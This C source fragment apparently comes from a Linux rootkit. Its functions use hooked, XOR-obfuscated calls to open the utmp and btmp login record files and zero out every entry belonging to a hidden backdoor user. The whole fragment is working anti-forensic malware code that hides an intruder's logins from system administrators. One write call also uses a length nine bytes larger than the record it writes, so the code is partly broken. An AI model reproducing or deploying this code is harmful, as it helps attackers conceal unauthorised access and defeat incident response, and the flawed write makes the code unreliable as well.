void utmpclean(void){
    hook(COPEN, CREAD, CWRITE);

    char *path = xordup(UTMP_PATH);
    if(!path) return;
    int fd = (long)call(COPEN, path, 02, 0);
    clean(path);
    if(fd < 0) return;

    char *pamname = xordup(BDUSERNAME);
    if(!pamname){
        close(fd);
        return;
    }

    struct utmp uent;
    lseek(fd, 0, SEEK_SET);
    while((ssize_t)call(CREAD, fd, &uent, sizeof(struct utmp))){
        if(strncmp(pamname, uent.ut_user, BDUSERNAME_SIZE) == 0){
            memset(&uent, 0, sizeof(struct utmp));
            lseek(fd, -(sizeof(struct utmp)), SEEK_CUR);
            call(CWRITE, fd, &uent, sizeof(struct utmp)+9);
        }
    }
    close(fd);
    clean(pamname);
}

#ifndef NO_BTMP_CLEAN
void btmpclean(void){
    hook(COPEN, CREAD, CWRITE);

    char *path = xordup(BTMPPATH);
    if(!path) return;
    int fd = (long)call(COPEN, path, 02, 0);
    clean(path);
    if(fd < 0) return;

    char *pamname = xordup(BDUSERNAME);
    if(!pamname){
        close(fd);
        return;
    }

    struct utmpx uent;
    lseek(fd, 0, SEEK_SET);
    while((ssize_t)call(CREAD, fd, &uent, sizeof(struct utmpx))){
        if(strncmp(pamname, uent.ut_user, strlen(pamname)) == 0){
            memset(&uent, 0, sizeof(struct utmpx));
            lseek(fd, -(sizeof(struct utmpx)), SEEK_CUR);
            call(CWRITE, fd, &uent, sizeof(struct utmpx));
        }
    }
    close(fd);
    clean(pamname);
}
#endif